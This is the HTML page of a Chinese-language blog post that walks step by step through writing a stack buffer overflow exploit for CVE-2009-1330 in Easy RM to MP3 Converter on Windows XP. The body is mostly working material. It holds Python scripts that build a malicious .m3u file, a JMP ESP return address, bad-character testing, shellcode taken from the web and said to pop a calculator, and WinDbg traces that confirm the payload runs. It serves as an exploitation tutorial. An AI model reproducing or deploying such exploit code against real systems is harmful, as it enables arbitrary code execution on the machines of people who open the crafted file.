<!DOCTYPE html>
<html>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta name="description" content="0x00.POC实践环境及工具    VMware + WinXP_SP3_EN Immunity Debugger 1.85 Vulnerable App获取: https://www.exploit-db.com/exploits/10374/    0x02.溢出攻击简介&amp;emsp;Easy RM to MP3 Converter 2.7.3.700版本在对.m3u格式文件进行转换时文件内容">
<meta name="keywords" content="CVE-2009-1330">
<meta property="og:type" content="article">
<meta property="og:title" content="EasyRMtoMP3 Converter  &#39;.m3u&#39;格式转换栈溢出之利用编写">
<meta property="og:url" content="http://yoursite.com/2017/02/28/CVE-2009-1330-m3u-Exploit/index.html">
<meta property="og:site_name" content="The Cyber_Hunter">
<meta property="og:description" content="0x00.POC实践环境及工具    VMware + WinXP_SP3_EN Immunity Debugger 1.85 Vulnerable App获取: https://www.exploit-db.com/exploits/10374/    0x02.溢出攻击简介&amp;emsp;Easy RM to MP3 Converter 2.7.3.700版本在对.m3u格式文件进行转换时文件内容">
<meta property="og:image" content="http://yoursite.com/2017/02/28/CVE-2009-1330-m3u-Exploit/1.png">
<meta property="og:image" content="http://yoursite.com/2017/02/28/CVE-2009-1330-m3u-Exploit/2.png">
<meta property="og:image" content="http://yoursite.com/2017/02/28/CVE-2009-1330-m3u-Exploit/3.png">
<meta property="og:image" content="http://yoursite.com/2017/02/28/CVE-2009-1330-m3u-Exploit/4.png">
<meta property="og:image" content="http://yoursite.com/2017/02/28/CVE-2009-1330-m3u-Exploit/5.png">
<meta property="og:image" content="http://yoursite.com/2017/02/28/CVE-2009-1330-m3u-Exploit/6.png">
<meta property="og:image" content="http://yoursite.com/2017/02/28/CVE-2009-1330-m3u-Exploit/7.png">
<meta property="og:image" content="http://yoursite.com/2017/02/28/CVE-2009-1330-m3u-Exploit/8.png">
<meta property="og:image" content="http://yoursite.com/2017/02/28/CVE-2009-1330-m3u-Exploit/9.gif">
<meta property="og:updated_time" content="2018-03-23T07:36:15.000Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="EasyRMtoMP3 Converter  &#39;.m3u&#39;格式转换栈溢出之利用编写">
<meta name="twitter:description" content="0x00.POC实践环境及工具    VMware + WinXP_SP3_EN Immunity Debugger 1.85 Vulnerable App获取: https://www.exploit-db.com/exploits/10374/    0x02.溢出攻击简介&amp;emsp;Easy RM to MP3 Converter 2.7.3.700版本在对.m3u格式文件进行转换时文件内容">
<meta name="twitter:image" content="http://yoursite.com/2017/02/28/CVE-2009-1330-m3u-Exploit/1.png">
    
    
        
          
              <link rel="shortcut icon" href="/images/favicon.ico">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
          
        
    
    <!-- title -->
    <title>EasyRMtoMP3 Converter  &#39;.m3u&#39;格式转换栈溢出之利用编写</title>
    <!-- styles -->
    <link rel="stylesheet" href="/css/style.css">
    <!-- rss -->
    
    
</head>

<body class="max-width mx-auto px3">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="/projects_url">Projects</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/2017/06/23/Dionaea-Ip-Map/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/2017/02/25/CVE-1999-1510-egghunter/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2017/02/28/CVE-2009-1330-m3u-Exploit/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2017/02/28/CVE-2009-1330-m3u-Exploit/&text=EasyRMtoMP3 Converter  &#39;.m3u&#39;格式转换栈溢出之利用编写"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2017/02/28/CVE-2009-1330-m3u-Exploit/&title=EasyRMtoMP3 Converter  &#39;.m3u&#39;格式转换栈溢出之利用编写"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2017/02/28/CVE-2009-1330-m3u-Exploit/&is_video=false&description=EasyRMtoMP3 Converter  &#39;.m3u&#39;格式转换栈溢出之利用编写"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=EasyRMtoMP3 Converter  &#39;.m3u&#39;格式转换栈溢出之利用编写&body=Check out this article: http://yoursite.com/2017/02/28/CVE-2009-1330-m3u-Exploit/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2017/02/28/CVE-2009-1330-m3u-Exploit/&title=EasyRMtoMP3 Converter  &#39;.m3u&#39;格式转换栈溢出之利用编写"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2017/02/28/CVE-2009-1330-m3u-Exploit/&title=EasyRMtoMP3 Converter  &#39;.m3u&#39;格式转换栈溢出之利用编写"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2017/02/28/CVE-2009-1330-m3u-Exploit/&title=EasyRMtoMP3 Converter  &#39;.m3u&#39;格式转换栈溢出之利用编写"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2017/02/28/CVE-2009-1330-m3u-Exploit/&title=EasyRMtoMP3 Converter  &#39;.m3u&#39;格式转换栈溢出之利用编写"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2017/02/28/CVE-2009-1330-m3u-Exploit/&name=EasyRMtoMP3 Converter  &#39;.m3u&#39;格式转换栈溢出之利用编写&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      
    </div>
  </span>
</div>

    
    <div class="content index my4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        EasyRMtoMP3 Converter  &#39;.m3u&#39;格式转换栈溢出之利用编写
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">KASYMOBV LEE</span>
      </span>
      
    <div class="postdate">
        <time datetime="2017-02-27T17:26:00.000Z" itemprop="datePublished">2017-02-28</time>
    </div>


      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link" href="/tags/CVE-2009-1330/">CVE-2009-1330</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <p><strong>0x00.POC实践环境及工具</strong>  </p>
<ol>
<li>VMware + WinXP_SP3_EN</li>
<li>Immunity Debugger 1.85</li>
<li>Vulnerable App获取: <a href="https://www.exploit-db.com/exploits/10374/" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/10374/</a>  </li>
</ol>
<p><strong>0x02.溢出攻击简介</strong><br>&emsp;Easy RM to MP3 Converter 2.7.3.700版本在对.m3u格式文件进行转换时文件内容加载时未对缓冲区大小进行检查，可导致栈溢出攻击  </p>
<p><strong>0x03.漏洞Fuzzer</strong><br>&emsp;Crash_Fuzzer.py<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Crash File to Crash EasyRMtoMP3Converter2.7.3.700.exe on WinXP SP3 EN Write With Python</span></span><br><span class="line">f = open(<span class="string">'crash_py.m3u'</span>,<span class="string">'w'</span>)</span><br><span class="line">f.write(<span class="string">"\x41"</span>*<span class="number">10000</span>)</span><br><span class="line">f.write(<span class="string">"\x41"</span>*<span class="number">10000</span>)</span><br><span class="line">f.close()</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Crash File m3u Create Successful.. \n"</span></span><br></pre></td></tr></table></figure></p>
<p>&emsp;执行脚本生成crash_py.m3u文件，Easy RM to MP3 Converter载入，修改”\x41”的数量10000~20000~30000字节，25000～30000字节之间执行后程序直接报错<br><img src="/2017/02/28/CVE-2009-1330-m3u-Exploit/1.png"><br><strong>0x04.构造Exploit</strong><br>1.&emsp;定位EIP的相对偏移大小:<br>&emsp;使用metasploit-framework附带小工具pettarn_creat.rb生成测试字符串<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby pattern_create.rb -l 5000 &gt; C:\pattern.txt</span><br></pre></td></tr></table></figure></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Streip = (“Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3A...省省省...b6Gb7Gb8Gb9Gc0Gc1Gc2Gc3Gc4Gc5Gc6Gc7Gc8Gc9Gd0Gd1Gd2Gd3Gd4Gd5Gd6Gd7Gd8Gd9Ge0Ge1Ge2Ge3Ge4Ge5Ge6Ge7Ge8Ge9Gf0Gf1Gf2Gf3Gf4Gf5Gf6Gf7Gf8Gf9Gg0Gg1Gg2Gg3Gg4Gg5Gg6Gg7Gg8Gg9Gh0Gh1Gh2Gh3Gh4Gh5Gh6Gh7Gh8Gh9Gi0Gi1Gi2Gi3Gi4Gi5Gi6Gi7Gi8Gi9Gj0Gj1Gj2Gj3Gj4Gj5Gj6Gj7Gj8Gj9Gk0Gk1Gk2Gk3Gk4Gk5Gk”)</span><br></pre></td></tr></table></figure>
<p>&emsp;替换Fuzzer中的Buffer<br>&emsp;Crash_Find_EIP.py<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Crash File to Crash EasyRMtoMP3Converter2.7.3.700.exe on WinXP SP3 EN Write With Python</span></span><br><span class="line">f = open(<span class="string">'crash_py.m3u'</span>,<span class="string">'w'</span>)</span><br><span class="line">f.write(<span class="string">"\x41"</span>*25000 + (“Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3A...省省省...b6Gb7Gb8Gb9Gc0Gc1Gc2Gc3Gc4Gc5Gc6Gc7Gc8Gc9Gd0Gd1Gd2Gd3Gd4Gd5Gd6Gd7Gd8Gd9Ge0Ge1Ge2Ge3Ge4Ge5Ge6Ge7Ge8Ge9Gf0Gf1Gf2Gf3Gf4Gf5Gf6Gf7Gf8Gf9Gg0Gg1Gg2Gg3Gg4Gg5Gg6Gg7Gg8Gg9Gh0Gh1Gh2Gh3Gh4Gh5Gh6Gh7Gh8Gh9Gi0Gi1Gi2Gi3Gi4Gi5Gi6Gi7Gi8Gi9Gj0Gj1Gj2Gj3Gj4Gj5Gj6Gj7Gj8Gj9Gk0Gk1Gk2Gk3Gk4Gk5Gk”)</span><br><span class="line">f.close()</span><br><span class="line"><span class="built_in">print</span> <span class="string">"Crash File m3u Create Successful.. \n"</span></span><br></pre></td></tr></table></figure></p>
<p>&emsp;执行脚本<br><img src="/2017/02/28/CVE-2009-1330-m3u-Exploit/2.png"><br>&emsp;返回错误EIP地址： 356a4234<br>&emsp;接下来使用pattern_offset.rb定位出错EIP偏移位置<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby pattern_offset.rb -q 356a4234 -l 5000</span><br></pre></td></tr></table></figure></p>
<p><img src="/2017/02/28/CVE-2009-1330-m3u-Exploit/3.png"><br>&emsp;计算出偏移地址1064字节<br>&emsp;EIP位置位于m3u文件偏移25000 + 1064 = 26064字节处<br>2.&emsp;&emsp;确定“JMP ESP”的地址<br><img src="/2017/02/28/CVE-2009-1330-m3u-Exploit/4.png"><br>&emsp;选取C:\WINDOWS\system32\SHELL32.dll文件中的一条”JMP ESP”指令的地址值<br><img src="/2017/02/28/CVE-2009-1330-m3u-Exploit/5.png"><br>&emsp;可以发现有相当多的地址可选，这里我们随便选取第一条：7c9d30d7.<br>3.&emsp;剔除坏字符:<br>&emsp;构造.m3u文件,将需要存放ShellCode的位置放入\x00~\Xff字符串（先去掉\x00)<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Crash File to Crash EasyRMtoMP3Converter2.7.3.700.exe on WinXP SP3 EN Write With Python</span></span><br><span class="line"></span><br><span class="line">junk = <span class="string">"\x41"</span> * <span class="number">26064</span></span><br><span class="line"></span><br><span class="line">eipaddr = <span class="string">"\xd7\x30\x9d\x7c"</span>&amp;emsp; <span class="comment">#jmp esp address from  C:\WINDOWS\system32\SHELL32.dll 7c9d30d7</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#BadChar: \x00,  </span></span><br><span class="line">CharCheck = (<span class="string">"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"</span></span><br><span class="line"><span class="string">"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"</span></span><br><span class="line"><span class="string">"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"</span></span><br><span class="line"><span class="string">"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"</span></span><br><span class="line"><span class="string">"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"</span></span><br><span class="line"><span class="string">"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"</span></span><br><span class="line"><span class="string">"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"</span></span><br><span class="line"><span class="string">"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#Bad Characters Check  </span></span><br><span class="line">data = junk + eipaddr + CharCheck</span><br><span class="line"></span><br><span class="line">f = open(<span class="string">'crash_py.m3u'</span>,<span class="string">'w'</span>)</span><br><span class="line">f.write(data)</span><br><span class="line">f.close()</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Crash File m3u Create Successful.. \n"</span></span><br></pre></td></tr></table></figure></p>
<p>&emsp;运行生成m3u文件，重载程序，在7c9d30d7处下断点，执行至该处断下  <img src="/2017/02/28/CVE-2009-1330-m3u-Exploit/6.png"><br>&emsp;查看当前[ESP-8]处的内存区<br><img src="/2017/02/28/CVE-2009-1330-m3u-Exploit/7.png"><br>&emsp;发现坏字符\x09，循环以往，共剔除坏字符”\x00,\x01,\x09,\x0a”  </p>
<p>4.&emsp;构造ShellCode：<br>&emsp;这里我们直接选用网上一段不含以上坏字符的弹出计算器的ShellCode<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">shellcode = (<span class="string">"\xdb\xc0\x31\xc9\xbf\x7c\x16\x70\xcc\xd9\x74\x24\xf4\xb1"</span> </span><br><span class="line"><span class="string">"\x1e\x58\x31\x78\x18\x83\xe8\xfc\x03\x78\x68\xf4\x85\x30"</span> </span><br><span class="line"><span class="string">"\x78\xbc\x65\xc9\x78\xb6\x23\xf5\xf3\xb4\xae\x7d\x02\xaa"</span> </span><br><span class="line"><span class="string">"\x3a\x32\x1c\xbf\x62\xed\x1d\x54\xd5\x66\x29\x21\xe7\x96"</span> </span><br><span class="line"><span class="string">"\x60\xf5\x71\xca\x06\x35\xf5\x14\xc7\x7c\xfb\x1b\x05\x6b"</span> </span><br><span class="line"><span class="string">"\xf0\x27\xdd\x48\xfd\x22\x38\x1b\xa2\xe8\xc3\xf7\x3b\x7a"</span> </span><br><span class="line"><span class="string">"\xcf\x4c\x4f\x23\xd3\x53\xa4\x57\xf7\xd8\x3b\x83\x8e\x83"</span> </span><br><span class="line"><span class="string">"\x1f\x57\x53\x64\x51\xa1\x33\xcd\xf5\xc6\xf5\xc1\x7e\x98"</span> </span><br><span class="line"><span class="string">"\xf5\xaa\xf1\x05\xa8\x26\x99\x3d\x3b\xc0\xd9\xfe\x51\x61"</span> </span><br><span class="line"><span class="string">"\xb6\x0e\x2f\x85\x19\x87\xb7\x78\x2f\x59\x90\x7b\xd7\x05"</span> </span><br><span class="line"><span class="string">"\x7f\xe8\x7b\xca"</span>)</span><br></pre></td></tr></table></figure></p>
<p><strong>0x04.编写Exploit：</strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Crash File to Crash EasyRMtoMP3Converter2.7.3.700.exe on WinXP SP3 EN Write With Python</span></span><br><span class="line"></span><br><span class="line">junk = <span class="string">"\x41"</span> * <span class="number">26064</span></span><br><span class="line">eipaddr = <span class="string">"\xd7\x30\x9d\x7c"</span>    <span class="comment">#jmp esp address from C:\WINDOWS\system32\SHELL32.dll 7c9d30d7</span></span><br><span class="line">shellcode = (<span class="string">"\xdb\xc0\x31\xc9\xbf\x7c\x16\x70\xcc\xd9\x74\x24\xf4\xb1"</span> </span><br><span class="line"><span class="string">"\x1e\x58\x31\x78\x18\x83\xe8\xfc\x03\x78\x68\xf4\x85\x30"</span> </span><br><span class="line"><span class="string">"\x78\xbc\x65\xc9\x78\xb6\x23\xf5\xf3\xb4\xae\x7d\x02\xaa"</span> </span><br><span class="line"><span class="string">"\x3a\x32\x1c\xbf\x62\xed\x1d\x54\xd5\x66\x29\x21\xe7\x96"</span> </span><br><span class="line"><span class="string">"\x60\xf5\x71\xca\x06\x35\xf5\x14\xc7\x7c\xfb\x1b\x05\x6b"</span> </span><br><span class="line"><span class="string">"\xf0\x27\xdd\x48\xfd\x22\x38\x1b\xa2\xe8\xc3\xf7\x3b\x7a"</span> </span><br><span class="line"><span class="string">"\xcf\x4c\x4f\x23\xd3\x53\xa4\x57\xf7\xd8\x3b\x83\x8e\x83"</span> </span><br><span class="line"><span class="string">"\x1f\x57\x53\x64\x51\xa1\x33\xcd\xf5\xc6\xf5\xc1\x7e\x98"</span> </span><br><span class="line"><span class="string">"\xf5\xaa\xf1\x05\xa8\x26\x99\x3d\x3b\xc0\xd9\xfe\x51\x61"</span> </span><br><span class="line"><span class="string">"\xb6\x0e\x2f\x85\x19\x87\xb7\x78\x2f\x59\x90\x7b\xd7\x05"</span> </span><br><span class="line"><span class="string">"\x7f\xe8\x7b\xca"</span>)</span><br><span class="line"></span><br><span class="line">data = junk + eipaddr + shellcode </span><br><span class="line"></span><br><span class="line">f = open(<span class="string">'crash_py.m3u'</span>,<span class="string">'w'</span>)</span><br><span class="line">f.write(data)</span><br><span class="line">f.close()</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Crash File m3u Create Successful.. \n"</span></span><br></pre></td></tr></table></figure></p>
<p><strong>0x05.攻击测试</strong><br>&emsp;重新生成m3u文件，Windbg重载的Easy RM to MP3 Converter，再次在7c9d30d7处下断点，执行至该处断下<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; dd /c 5 000ffd30</span><br><span class="line">000ffd30  7c9d30d7 c931c0db 70167cbf 2474d9cc 581eb1f4</span><br><span class="line">000ffd44  83187831 7803fce8 3085f468 c965bc78 f523b678</span><br><span class="line">000ffd58  7daeb4f3 323aaa02 ed62bf1c 66d5541d 96e72129</span><br><span class="line">000ffd6c  ca71f560 14f53506 1bfb7cc7 27f06b05 22fd48dd</span><br><span class="line">000ffd80  e8a21b38 7a3bf7c3 234f4ccf 57a453d3 833bd8f7</span><br><span class="line">000ffd94  571f838e a1516453 c6f5cd33 987ec1f5 05f1aaf5</span><br><span class="line">000ffda8  3d9926a8 fed9c03b</span><br></pre></td></tr></table></figure></p>
<p>&emsp;F10单步执行一次<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; p</span><br><span class="line">eax=00000001 ebx=00104a58 ecx=7c91003d edx=00ce0000 esi=77c5fce0 edi=00006664</span><br><span class="line">eip=000ffd38 esp=000ffd38 ebp=00104678 iopl=0         nv up ei pl nz ac pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000216</span><br><span class="line">000ffd38 bf7c1670cc      mov     edi,0CC70167Ch</span><br></pre></td></tr></table></figure></p>
<p>&emsp;查看此时ESP堆栈<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; dd /c 5 000ffd38</span><br><span class="line">000ffd38  70167cbf 2474d9cc 581eb1f4 83187831 7803fce8</span><br><span class="line">000ffd4c  3085f468 c965bc78 f523b678 7daeb4f3 323aaa02</span><br><span class="line">000ffd60  ed62bf1c 66d5541d 96e72129 ca71f560 14f53506</span><br><span class="line">000ffd74  1bfb7cc7 27f06b05 22fd48dd e8a21b38 7a3bf7c3</span><br><span class="line">000ffd88  234f4ccf 57a453d3 833bd8f7 571f838e a1516453</span><br><span class="line">000ffd9c  c6f5cd33 987ec1f5 05f1aaf5 3d9926a8 fed9c03b</span><br><span class="line">000ffdb0  0eb66151 8719852f</span><br></pre></td></tr></table></figure></p>
<p>&emsp;可以发现此时ShellCode的执行跳过的“c931c0db”一段，那么“JMP ESP”后面添加4个nop指令<br>&emsp;修改Exploit：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Crash File to Crash EasyRMtoMP3Converter2.7.3.700.exe on WinXP SP3 Write With Python</span></span><br><span class="line"></span><br><span class="line">junk = <span class="string">"\x41"</span> * <span class="number">26064</span></span><br><span class="line">eipaddr = <span class="string">"\xd7\x30\x9d\x7c"</span>    <span class="comment">#jmp esp address from C:\WINDOWS\system32\SHELL32.dll 7c9d30d7</span></span><br><span class="line">nops = <span class="string">"\x90"</span>*<span class="number">8</span></span><br><span class="line">shellcode = (<span class="string">"\xdb\xc0\x31\xc9\xbf\x7c\x16\x70\xcc\xd9\x74\x24\xf4\xb1"</span> </span><br><span class="line"><span class="string">"\x1e\x58\x31\x78\x18\x83\xe8\xfc\x03\x78\x68\xf4\x85\x30"</span> </span><br><span class="line"><span class="string">"\x78\xbc\x65\xc9\x78\xb6\x23\xf5\xf3\xb4\xae\x7d\x02\xaa"</span> </span><br><span class="line"><span class="string">"\x3a\x32\x1c\xbf\x62\xed\x1d\x54\xd5\x66\x29\x21\xe7\x96"</span> </span><br><span class="line"><span class="string">"\x60\xf5\x71\xca\x06\x35\xf5\x14\xc7\x7c\xfb\x1b\x05\x6b"</span> </span><br><span class="line"><span class="string">"\xf0\x27\xdd\x48\xfd\x22\x38\x1b\xa2\xe8\xc3\xf7\x3b\x7a"</span> </span><br><span class="line"><span class="string">"\xcf\x4c\x4f\x23\xd3\x53\xa4\x57\xf7\xd8\x3b\x83\x8e\x83"</span> </span><br><span class="line"><span class="string">"\x1f\x57\x53\x64\x51\xa1\x33\xcd\xf5\xc6\xf5\xc1\x7e\x98"</span> </span><br><span class="line"><span class="string">"\xf5\xaa\xf1\x05\xa8\x26\x99\x3d\x3b\xc0\xd9\xfe\x51\x61"</span> </span><br><span class="line"><span class="string">"\xb6\x0e\x2f\x85\x19\x87\xb7\x78\x2f\x59\x90\x7b\xd7\x05"</span> </span><br><span class="line"><span class="string">"\x7f\xe8\x7b\xca"</span>)</span><br><span class="line"></span><br><span class="line">data = junk + eipaddr + nops + shellcode </span><br><span class="line"></span><br><span class="line">f = open(<span class="string">'crash_py.m3u'</span>,<span class="string">'w'</span>)</span><br><span class="line">f.write(data)</span><br><span class="line">f.close()</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Crash File m3u Create Successful.. \n"</span></span><br></pre></td></tr></table></figure></p>
